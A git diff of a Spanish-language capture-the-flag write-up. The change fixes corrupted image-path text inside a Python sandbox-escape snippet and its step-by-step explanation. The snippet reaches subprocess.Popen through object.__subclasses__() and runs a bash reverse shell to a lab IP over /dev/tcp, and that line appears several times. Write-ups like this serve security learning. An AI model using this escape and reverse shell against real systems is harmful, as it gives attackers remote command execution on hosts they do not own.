@@ -21,47 +21,47 @@ La pagina trae un entorno de desarrollo con el lenguaje python, entre muchos có
 Con ayuda de un foro encontré una solución para bypassear una reverse shell en python. Como no comprendí muy bien este código hice que chatgpt me aclarara.
 
 ```python
-(../../image/).__class__.__base__.__subclasses__(../../image/)[317](../../image/
+().__class__.__base__.__subclasses__()[317](
 ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.132/1234 0>&1"])
 ```
 ## 🔍 **Paso a paso de la ejecución**
 
-1️⃣ `(../../image/)` → **Crea una instancia de un objeto vacío**
+1️⃣ `()` → **Crea una instancia de un objeto vacío**
 
-- En Python, `(../../image/)` representa un **objeto sin definir**.
+- En Python, `()` representa un **objeto sin definir**.
     
 - Luego, se accede a sus atributos internos.
     
 
-2️⃣ `(../../image/).__class__` → **Obtiene la clase del objeto**
+2️⃣ `().__class__` → **Obtiene la clase del objeto**
 
-- `(../../image/).__class__` devuelve `<class 'tuple'>`, ya que `(../../image/)` es una tupla vacía.
+- `().__class__` devuelve `<class 'tuple'>`, ya que `()` es una tupla vacía.
     
 
-3️⃣ `(../../image/).__class__.__base__` → **Obtiene la clase base de la tupla**
+3️⃣ `().__class__.__base__` → **Obtiene la clase base de la tupla**
 
-- La clase base de `tuple` en Python es `object`, por lo que `(../../image/).__class__.__base__` devuelve `<class 'object'>`.
+- La clase base de `tuple` en Python es `object`, por lo que `().__class__.__base__` devuelve `<class 'object'>`.
     
 
-4️⃣ `(../../image/).__class__.__base__.__subclasses__(../../image/)` → **Lista todas las subclases de `object`**
+4️⃣ `().__class__.__base__.__subclasses__()` → **Lista todas las subclases de `object`**
 
 - En Python, `object` es la clase base de todo.
     
-- `.subclasses__(../../image/)` devuelve una lista de **todas las clases derivadas** de `object` en memoria.
+- `.subclasses__()` devuelve una lista de **todas las clases derivadas** de `object` en memoria.
     
 
-5️⃣ `(../../image/)[317]` → **Accede a una clase específica**
+5️⃣ `()[317]` → **Accede a una clase específica**
 
-- `__subclasses__(../../image/)` devuelve una lista de cientos de clases.
+- `__subclasses__()` devuelve una lista de cientos de clases.
     
-- `317` es el índice de la clase que queremos (../../image/que en muchas versiones de Python es `subprocess.Popen` o similar).
+- `317` es el índice de la clase que queremos (que en muchas versiones de Python es `subprocess.Popen` o similar).
     
 
-6️⃣ `(../../image/)[317](../../image/[...])` → **Ejecuta un comando con `subprocess.Popen`**
+6️⃣ `()[317]([...])` → **Ejecuta un comando con `subprocess.Popen`**
 
 - `[317]` selecciona la clase `subprocess.Popen`.
     
-- Se ejecuta con `(../../image/["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.132/1234 0>&1"])`.
+- Se ejecuta con `(["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.132/1234 0>&1"])`.
 
 ## *Explotación*
 ![alt text](../../image/code4.png)
